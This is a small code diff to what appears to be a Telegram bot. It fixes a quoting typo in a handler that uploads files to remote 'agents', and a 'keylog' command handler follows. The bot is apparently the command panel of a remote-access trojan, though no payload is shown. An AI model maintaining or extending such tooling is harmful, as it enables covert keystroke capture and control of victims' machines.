@@ -307,7 +307,7 @@ async def upload_cmd(message: types.Message):
     if success:
         await message.reply(f"⬆️ Uploading `{path}` to **{agent_id}**", parse_mode="Markdown")
     else:
-        await message.reply(f"❌ Agent **{agent_id}** not found.", parse_mode="Markdown)
+        await message.reply(f"❌ Agent **{agent_id}** not found.", parse_mode="Markdown")
 
 @dp.message(Command("keylog"))
 async def keylog_cmd(message: types.Message):
